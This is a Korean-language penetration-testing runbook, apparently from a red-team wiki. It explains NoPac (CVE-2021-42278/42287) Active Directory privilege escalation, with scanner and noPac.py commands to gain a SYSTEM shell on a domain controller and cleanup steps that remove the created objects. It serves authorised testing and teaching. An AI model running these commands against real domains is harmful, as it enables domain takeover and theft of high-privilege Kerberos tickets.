---
tags:
  - 환경/ad
시작조건: ["유효한 일반 도메인 credential 확보", "DC 접근 가능", "NoPac 영향 가능성 확인"]
필요권한: ["컴퓨터 계정 생성과 sAMAccountName 변경이 가능한 도메인 사용자 권한"]
필요조건: ["패치되지 않은 DC", "MachineAccountQuota 또는 컴퓨터 객체 생성 권한", "DC FQDN과 IP", "기존에 없는 고유한 컴퓨터 계정 이름", "noPac"]
결과: ["고권한 Kerberos ticket", "SYSTEM 세션", "도메인 권한 상승"]
---

# NoPac sAMAccountName 스푸핑 권한 상승

## 한 줄 판단

공격 호스트에서 도메인 컨트롤러의 Kerberos·LDAP·SMB 서비스에 연결할 수 있고 일반 도메인 계정으로 컴퓨터 객체를 만들고 이름을 바꿀 수 있다면, 패치되지 않은 CVE-2021-42278·CVE-2021-42287 체인을 검증해 가장한 계정의 Kerberos ticket 또는 도메인 컨트롤러의 SYSTEM 세션을 얻는다.

## 전제 조건

| 구분 | 조건 | 확인 방법 |
|---|---|---|
| 시작 상태 | 유효한 일반 도메인 credential | LDAP 또는 Kerberos 인증 성공 |
| 필요 권한 | 컴퓨터 계정 생성과 속성 변경 | `ms-DS-MachineAccountQuota`와 실제 생성 권한 확인 |
| 입력·환경 | 영향받는 DC와 일치하는 이름·IP, 기존에 없는 `<NEW_COMPUTER_NAME>$` | 패치 상태, DC FQDN, 시간·DNS와 exact LDAP 조회 |

## 실행

> 컴퓨터 객체 생성·이름 변경·ticket·service 실행은 AD와 DC 상태에 영향을 남길 수 있다. exact DN·objectGUID·원래 이름·ccache와 service log를 구분해 복구하며, 패치·도구 동작은 정적으로 미확인이다.

`<USER>`는 인증 요청자, `<IMPERSONATE_USER>`는 가장할 계정, `<NEW_COMPUTER_NAME>`은 새 객체 이름이다. DC FQDN·IP, Base DN, ccache와 log 경로는 각 단계의 실행 호스트와 출력 출처를 유지한다.

### 방식 선택

| 목적 | 공격 호스트가 보유할 입력 | 대상과 실행 결과 | 성공 판단 |
|---|---|---|---|
| 영향 가능성 확인 | 일반 도메인 계정의 비밀번호, DC FQDN·IP | DC의 컴퓨터 객체 생성 조건과 Kerberos 응답 확인 | `MachineAccountQuota`만이 아니라 PAC가 포함된 TGT 획득 신호 확인 |
| DC의 SYSTEM 셸 획득 | 위 입력과 가장할 고권한 계정 | 지정한 DC에서 반대화형 셸 실행 | `Launching semi-interactive shell` 뒤 `whoami`가 `nt authority\system` |

`<USER>`는 NoPac 실행에 인증하는 현재 보유 계정이고, `<IMPERSONATE_USER>`는 취약점 체인으로 가장할 계정이다. 두 계정의 역할을 서로 바꾸지 않는다.

### 1. 영향 가능성 확인

실행 위치: DC의 Kerberos·LDAP·SMB 서비스에 연결할 수 있고 시간과 DNS가 맞는 공격 호스트.

```bash
sudo python3 scanner.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -use-ldap
```

확인할 출력:

- `Current ms-DS-MachineAccountQuota`.
- `Got TGT with PAC`와 대상 DC에서 받은 TGT.

`MachineAccountQuota`가 0보다 크다는 사실만으로 취약하다고 판정하지 않는다.

실패 시 확인:

- Kerberos 오류이면 DC FQDN, 공격 호스트와 DC의 시간 차이, DNS와 88/TCP·UDP 도달성을 확인한다.
- LDAP 또는 컴퓨터 객체 생성 오류이면 현재 인증 계정의 실제 생성 권한과 `ms-DS-MachineAccountQuota`를 분리해서 확인한다.

### 2. DC의 SYSTEM 셸 획득

실행 위치: 위 스캔을 수행한 공격 호스트. `<IMPERSONATE_USER>`는 대상 도메인에서 실제로 존재하는 고권한 계정으로 지정한다.

자동 생성 이름 대신 이번 실행을 식별할 `<NEW_COMPUTER_NAME>$`를 정하고, LDAP에서 같은 `sAMAccountName`이 없으며 noPac이 만들 ccache 경로도 기존 파일이 아님을 먼저 확인한다. LDAP 결과에 `dn:`이 나오면 다른 이름을 선택한다.

```bash
ldapsearch -LLL -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -W -b '<BASE_DN>' '(sAMAccountName=<NEW_COMPUTER_NAME>$)' distinguishedName sAMAccountName objectGUID
test ! -e '<DC_HOST>.ccache'
test ! -e '<IMPERSONATE_USER>_<DC_FQDN>.ccache'
```

```bash
sudo python3 noPac.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -dc-host <DC_HOST> -target-name '<NEW_COMPUTER_NAME>$' -shell --impersonate <IMPERSONATE_USER> -use-ldap
```

확인할 출력:

- 새 컴퓨터 계정 생성과 `sAMAccountName` 변경·복원 메시지.
- 고권한 ccache 저장.
- `Launching semi-interactive shell` 이후 대상에서 `whoami`가 `nt authority\system`.

셸은 열렸지만 `whoami`가 SYSTEM이 아니면 명령 실행 성공과 권한 상승을 구분하고, 실제 실행 계정·대상 hostname·가장한 계정을 다시 확인한다.

### 3. 고권한 ticket의 후속 사용 분리

NoPac에서 ccache가 저장되면 컴퓨터 객체 복구를 확인한 뒤 [[Pass the Ticket]]에서 ticket의 계정과 서비스 범위를 검증한다. 디렉터리 복제 정보가 필요하면 [[DCSync]]의 NoPac ticket 절차에서 복제 대상 계정을 별도로 지정한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| scanner에서 PAC 포함 TGT 획득 | 두 CVE 체인의 영향 가능성 높음 | exploit 후보 | 변경 영향을 확인한 뒤 최소 단위로 실행 |
| semi-interactive shell과 `nt authority\system` | DC에서 SYSTEM 명령 실행 확인 | 고권한 세션 확보 | 원복 확인 후 [[고권한 세션 확보 후 후속 판단]] |
| ccache만 저장 | 고권한 계정의 Kerberos ticket 확보 | ticket 확보 | 원복 확인 후 [[Pass the Ticket]]에서 티켓에 표시된 계정·서비스 범위 검증 |
| `MachineAccountQuota`만 표시 | 컴퓨터 생성 정책 단서일 뿐 취약성 미확정 | 시작 상태 유지 | PAC TGT와 실제 exploit 결과를 추가 확인 |
| 컴퓨터 계정 삭제 실패 | AD 객체가 잔존함 | 복구 필요 상태 | 추가 실행을 중단하고 기록한 정확한 객체 DN·objectGUID로 복구 미완료를 남김 |

## 확인할 출력과 권한

- 스캔 성공, 컴퓨터 객체 변경, 고권한 ticket, SYSTEM 셸과 후속 [[DCSync]]를 각각 별도 단계로 기록한다.
- 도구가 `administrator`를 가장했다는 메시지만으로 Domain Admin 또는 DCSync 성공을 단정하지 않는다.

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 새 AD 컴퓨터 객체 | 불필요한 머신 계정 잔존 | 출력의 생성 이름과 객체 DN을 조회 | 도구 삭제 성공을 확인하거나 정확한 객체 DN을 확인한 뒤 제거 |
| 컴퓨터 `sAMAccountName` | 이름 충돌과 인증 영향 | 원래 이름 복원 메시지와 LDAP 값 확인 | 원래 값으로 복원되었는지 재조회 |
| 공격 호스트 ccache | 고권한 ticket 파일 잔존 | 작업 디렉터리와 `KRB5CCNAME` 확인 | 관련 ccache만 삭제하고 환경 변수 해제 |
| 원격 서비스·명령 흔적 | EDR 탐지와 서비스 생성 가능 | 대상 로그와 임시 서비스 확인 | 이번 실행에서 생성한 서비스·파일만 정리 |

공식 noPac 구현은 작업 중 `sAMAccountName`을 `<NEW_COMPUTER_NAME>$`로 되돌린 뒤 자신이 추가한 컴퓨터 객체 삭제를 시도한다. `Restored ... to original value`와 컴퓨터 삭제 성공 메시지를 각각 확인하고, 마지막에는 같은 LDAP filter가 빈 결과인지 확인한다. `Delete computer ... Failed` 또는 이름 복원 실패를 성공적인 cleanup으로 간주하지 않는다.

이름은 복원됐지만 정확히 기록한 새 컴퓨터 객체만 남았다면, 해당 객체를 만든 요청자 권한으로 Impacket `addcomputer`의 `-delete`를 사용하고 다시 조회한다.

```bash
impacket-addcomputer '<DOMAIN>/<USER>' -dc-ip <DC_IP> -computer-name '<NEW_COMPUTER_NAME>$' -delete
ldapsearch -LLL -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -W -b '<BASE_DN>' '(sAMAccountName=<NEW_COMPUTER_NAME>$)' distinguishedName sAMAccountName objectGUID
```

이름 복원이 실패해 객체가 `<DC_HOST>`처럼 다른 `sAMAccountName`을 사용 중이면 이름만으로 삭제하지 않는다. 실행 출력에서 기록한 exact DN·objectGUID로 원래 `<NEW_COMPUTER_NAME>$` 복원 여부를 대조한 뒤 삭제하며, 실제 DC의 `<DC_HOST>$` 객체와 구분한다.

공격 호스트에서는 작업 전 없었던 것으로 확인된 두 ccache만 정확한 경로에서 제거하고 환경 변수를 해제한다.

```bash
unset KRB5CCNAME
rm -- '<DC_HOST>.ccache' '<IMPERSONATE_USER>_<DC_FQDN>.ccache'
test ! -e '<DC_HOST>.ccache'
test ! -e '<IMPERSONATE_USER>_<DC_FQDN>.ccache'
```

원격 명령 실행 과정에서 임시 서비스가 남았다는 증거가 있을 때만 로그에서 얻은 `<NOPAC_SERVICE_NAME>`의 실행 경로를 확인하고 그 exact service를 정리한다. 서비스 이름을 알 수 없으면 이름 패턴으로 일괄 삭제하지 않는다.

```cmd
sc.exe qc "<NOPAC_SERVICE_NAME>"
sc.exe stop "<NOPAC_SERVICE_NAME>"
sc.exe delete "<NOPAC_SERVICE_NAME>"
sc.exe query "<NOPAC_SERVICE_NAME>"
```

마지막 조회가 `1060`을 반환해야 해당 서비스가 없음을 확인한 것이다. 컴퓨터 객체·ccache·원격 서비스 중 확인하지 못한 항목이 있으면 전체 복구 완료로 기록하지 않는다.

## 관련 공격기법

- [[Pass the Ticket]]
- [[DCSync]]

## 관련 도구

- [[noPac]]

## 참고 링크

- [Ridter noPac 공식 구현의 이름 복원·컴퓨터 객체 삭제 흐름](https://github.com/Ridter/noPac/blob/main/noPac.py)
- [Fortra Impacket `addcomputer.py`의 `-delete` 옵션](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)

## 관련 상태 라우터

- [[고권한 세션 확보 후 후속 판단]]
- [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- [[확보한 자격 증명으로 원격 접근 경로 선택]]
